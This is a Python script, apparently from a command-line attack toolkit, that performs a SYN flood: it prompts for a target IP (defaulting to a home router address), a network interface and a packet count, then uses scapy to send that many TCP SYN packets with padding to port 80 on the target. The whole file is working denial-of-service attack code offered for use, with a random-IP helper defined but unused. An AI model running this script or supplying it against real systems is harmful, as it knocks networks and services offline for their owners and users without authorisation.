
def syn_flood_function():
    from scapy.all import Raw, send, RandShort
    from scapy.layers.inet import TCP, IP
    from banner_cli import rtxt, lmtxt, lctxt
    from random import randint


    try:
        xy  = 0
        def generate_random_ip():
            return ".".join(str(randint(0, 255)) for _ in range(4))
    # ------------ getting router ip -----------
        lmtxt('[?]    ENTER YOUR TARGET IP ( DEFAULT IP IS : 192.168.1.1 -> JUST PRESS ENTER ) : ', end='')
        router_ip = input('')
        if router_ip != '':
            router_ip = router_ip
        else :
            router_ip = '192.168.1.1'
    # ------------ getting interface -----------
        lmtxt('[?]    ENTER YOUR INTERFACE ( DEAFAULT IS : Wi-Fi -> JUST PRESS ENTER ) : ', end='')
        us_iface = input('')
        if us_iface != '':
            user_iface = us_iface
        else :
            user_iface = 'Wi-Fi'

        lmtxt('[?]    HOW MANY PACKETS YOU WANT TO SEND ? (int) ', end='')
        num = int(input(''))



        ip = IP(dst=router_ip)
        for i in range(num):
            target_port = 80
            
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b'x'*64)
            packet = ip / tcp / raw
            if us_iface == 'd':
                send(x=packet, iface=user_iface, verbose=0)
            else:
                send(x=packet, iface=user_iface, verbose=0)
            lctxt(f'\r[+]    PACKET NUMBER {xy} SENT' ,end='')
            xy += 1

    except Exception as er:
        print(er)
        rtxt('[!]    ERROR OCCURRED [SYN] ')



if __name__ == '__main__':
    syn_flood_function()




